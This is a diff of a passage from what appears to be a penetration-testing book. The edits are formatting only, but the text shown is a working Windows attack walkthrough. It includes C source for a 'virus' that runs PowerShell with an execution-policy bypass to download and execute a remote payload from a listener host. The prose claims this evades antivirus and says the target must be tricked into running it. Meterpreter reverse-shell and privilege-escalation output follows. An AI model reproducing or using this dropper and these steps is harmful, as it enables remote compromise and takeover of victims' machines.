@@ -340,7 +340,7 @@ G> `curl <listener-attack-ip>/payload.txt` or just browse the payload to verify 
 G>
 G> Now let us create our binary virus, we will write this in c. I am going to call this `download-payload-execute.c` because that is what it does. Obviously you would want to call it something that your target felt comfortable running. This is what it looks like:
 
-{title="psmsf", linenos=off, lang=c}
+{title="download-payload-execute", linenos=off, lang=c}
     #include<stdio.h>
     #include<stdlib.h>
     int main()
@@ -349,8 +349,10 @@ G> Now let us create our binary virus, we will write this in c. I am going to ca
       // system executes any command string you pass it.
       // Windows is happy with PowerShell of course.
       // noprofile causes no profile scripts to be loaded up front.
-      // Not sure if script execution is enabled on target system? No problem, just set executionpolicy to bypass for this session.
-      // This tells PowerShell to just trust that you know what you are doing, and that we are happy to download and run a malicious payload.
+      // Not sure if script execution is enabled on target system? No problem,
+      //   just set executionpolicy to bypass for this session.
+      // This tells PowerShell to just trust that you know what you are doing,
+      //   and that we are happy to download and run a malicious payload.
       // Invoke the EXpression: download the payload and execute it.
       // Providing the payload does not trigger anti virus, this should not.
       system("powershell.exe -noprofile -executionpolicy bypass \"IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))\"");
@@ -366,7 +368,8 @@ G> Now let us create our binary virus, we will write this in c. I am going to ca
 G> With this, neither the payload or the virus should trigger Anti-Virus.
 G>
 G> Now you will need a c compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, so you should be good to compile the virus.
-G>
+
+{icon=bomb}
 G> `gcc download-payload-execute.c -o download-payload-execute.exe`
 G>
 G> This should provide you with an executable that AV will be happy about. You just need to convince your target to run it. When they do, your listener will catch the reverse_tcp shell.
@@ -385,9 +388,9 @@ G>
 G> `Active sessions`  
 G> `===============`  
 G>
-G> `  Id  Type                     Information              Connection`  
-G> `  --  ----                     -----------              ----------`  
-G `  6  meterpreter x86/windows  <target-host>\kim @ <target-host>  <listener-attack-ip>:4444 -> <target-ip>:63814 (<target-ip>)`
+G> `Id  Type                     Information              Connection`  
+G> `--  ----                     -----------              ----------`  
+G> `6  meterpreter x86/windows  <target-host>\kim @ <target-host>  <listener-attack-ip>:4444 -> <target-ip>:63814 (<target-ip>)`
 G>
 G> To interact with your shell:
 G>
@@ -403,7 +406,8 @@ G> `Server username: <target-host>\kim`
 G>
 G> `meterpreter > pwd`  
 G> `C:\Users\kim\Desktop`
-G>
+
+{icon=bomb}
 G> Check which extensions we have loaded:
 G>
 G> `meterpreter > use -l`  
@@ -430,12 +434,12 @@ G> `Attempt to elevate your privilege to that of local system.`
 G>
 G> `OPTIONS:`
 G>
-G> `  -h        Help Banner.`  
-G> `  -t <opt>  The technique to use. (Default to '0').`  
-G> `    0 : All techniques available`  
-G> `    1 : Named Pipe Impersonation (In Memory/Admin)`  
-G> `    2 : Named Pipe Impersonation (Dropper/Admin)`  
-G> `    3 : Token Duplication (In Memory/Admin)`
+G> `-h        Help Banner.`  
+G> `-t <opt>  The technique to use. (Default to '0').`  
+G> `0 : All techniques available`  
+G> `1 : Named Pipe Impersonation (In Memory/Admin)`  
+G> `2 : Named Pipe Impersonation (Dropper/Admin)`  
+G> `3 : Token Duplication (In Memory/Admin)`
 G>
 G> `meterpreter > getsystem`  
 G> `...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).`  
@@ -456,9 +460,9 @@ G>
 G> `Jobs`  
 G> `====`
 G>
-G> `  Id  Name                    Payload                          Payload opts`  
-G> `  --  ----                    -------                          ------------`  
-G> `  6   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://<listener-attack-ip>:4444`
+G> `Id  Name                    Payload                          Payload opts`  
+G> `--  ----                    -------                          ------------`  
+G> `6   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://<listener-attack-ip>:4444`
 G>
 G> `msf exploit(handler) > jobs -K`  
 G> `Stopping all jobs...`  
@@ -559,7 +563,7 @@ That code looks like the following, I have added the annotations to help you und
         # Create a thread to execute within the virtual address space of the calling PowerShell
         #   (which happens on the last line).
         # The third parameter represents the starting address of the thread,
-	#   the shellcode to be executed by the thread.
+        #   the shellcode to be executed by the thread.
         # Setting the fifth parameter to 0 declares that the thread should run
         #   immediately after creation.
         # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682453(v=vs.85).aspx
